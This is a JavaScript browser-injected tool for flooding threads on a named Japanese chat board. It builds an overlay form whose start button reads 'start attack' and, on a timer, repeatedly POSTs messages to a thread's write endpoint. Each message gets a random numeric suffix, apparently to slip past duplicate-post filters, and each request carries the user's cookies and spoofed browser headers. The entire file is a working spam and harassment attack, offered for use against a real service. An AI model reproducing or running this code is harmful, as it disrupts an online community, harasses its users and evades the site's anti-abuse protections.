(function() {
  const tailwindLink = document.createElement('link');
  tailwindLink.href = 'https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css';
  tailwindLink.rel = 'stylesheet';
  document.head.appendChild(tailwindLink);

  const formContainer = document.createElement('div');
  formContainer.innerHTML = `
    <div class="fixed top-0 left-0 w-full bg-gray-900 bg-opacity-50 flex items-center justify-center z-50 py-4">
      <div class="bg-white rounded-2xl p-8 w-full max-w-2xl space-y-6">
        <h1 class="text-2xl font-bold text-center">チャット広場レス連投ツール</h1>
        <div class="space-y-4">
          <div>
            <label class="block font-medium">スレッドに自動で連投</label>
            <input type="checkbox" id="autoThreadId" class="h-5 w-5 text-blue-500" />
          </div>
          <div id="threadIdContainer" class="hidden">
            <label class="block font-medium">Thread ID</label>
            <input type="text" id="thread_id" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
          </div>
          <div>
            <label class="block font-medium">Name</label>
            <input type="text" id="name" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
          </div>
          <div>
            <label class="block font-medium">Message</label>
            <textarea id="message" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
          </div>
          <div class="grid grid-cols-2 gap-4">
            <div>
              <label class="block font-medium">Edit Password</label>
              <input type="text" id="edit_password" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
            </div>
            <div>
              <label class="block font-medium">Delete Password</label>
              <input type="text" id="delete_password" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
            </div>
            <div>
              <label class="block font-medium">Post Password</label>
              <input type="text" id="post_password" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
            </div>
            <div>
              <label class="block font-medium">View Password</label>
              <input type="text" id="view_password" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
            </div>
          </div>
          <div>
            <label class="block font-medium">Interval (ms)</label>
            <input type="number" id="interval" value="8000" class="w-full bg-white border rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
          </div>
        </div>
        <div class="flex justify-between gap-4">
          <button onclick="startPosting()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">攻撃開始</button>
          <button onclick="stopPosting()" class="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">停止</button>
        </div>
        <div id="log" class="bg-gray-200 text-sm p-3 rounded h-48 overflow-y-auto font-mono whitespace-pre-wrap"></div>
      </div>
    </div>
  `;
  document.body.appendChild(formContainer);

  window.intervalId = null;

  const updateThreadIdVisibility = function() {
    const threadIdContainer = document.getElementById('threadIdContainer');
    const autoThreadId = document.getElementById('autoThreadId').checked;
    threadIdContainer.style.display = autoThreadId ? 'none' : 'block';
  };

  document.addEventListener('DOMContentLoaded', function() {
    // 初期状態で表示を更新
    updateThreadIdVisibility();
  });

  document.getElementById('autoThreadId').addEventListener('change', updateThreadIdVisibility);

  window.startPosting = function() {
    const autoThreadId = document.getElementById('autoThreadId').checked;
    const name = document.getElementById('name').value;
    const baseMessage = document.getElementById('message').value;
    const edit_password = document.getElementById('edit_password').value;
    const delete_password = document.getElementById('delete_password').value;
    const post_password = document.getElementById('post_password').value;
    const view_password = document.getElementById('view_password').value;
    const interval = parseInt(document.getElementById('interval').value, 10);

    const logMessage = function(msg) {
      const log = document.getElementById('log');
      log.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
      log.scrollTop = log.scrollHeight;
    };

    if (window.intervalId !== null) {
      logMessage("すでに実行中です。");
      return;
    }

    if (!autoThreadId) {
      const threadId = document.getElementById('thread_id').value;
      if (!threadId) {
        logMessage("Thread IDが入力されていません。");
        return;
      }
    }

    logMessage("連投を開始しました");

    window.intervalId = setInterval(function() {
      const rand = Math.random().toFixed(4);
      const formData = new FormData();
      formData.append("name", name);
      formData.append("message", baseMessage + "\n\n" + rand);
      formData.append("submit", "投稿");
      formData.append("email", "");
      formData.append("files[]", new File([], ''));
      formData.append("edit_password", edit_password);
      formData.append("delete_password", delete_password);
      formData.append("post_password", post_password);
      formData.append("view_password", view_password);

      const threadId = autoThreadId ? window.location.pathname.split('/')[1] : document.getElementById('thread_id').value;

      fetch(`https://chatpark.nieru.net/${threadId}/write`, {
        method: "POST",
        body: formData,
        credentials: "include",
        headers: {
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "Accept-Language": "ja",
          "Sec-CH-UA": '"Chromium";v="135", "Not-A.Brand";v="8"',
          "Sec-CH-UA-Mobile": "?0",
          "Sec-CH-UA-Platform": '"Linux"',
          "Upgrade-Insecure-Requests": "1"
        },
        mode: "cors"
      })
      .then(res => res.text())
      .then(text => {
        logMessage(`送信成功（${rand}）`);
      })
      .catch(err => {
        logMessage("送信エラー: " + err);
      });

    }, interval);
  };

  window.stopPosting = function() {
    const logMessage = function(msg) {
      const log = document.getElementById('log');
      log.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
      log.scrollTop = log.scrollHeight;
    };

    if (window.intervalId !== null) {
      clearInterval(window.intervalId);
      window.intervalId = null;
      logMessage("連投を停止しました");
    } else {
      logMessage("実行中の連投はありません");
    }
  };
})();
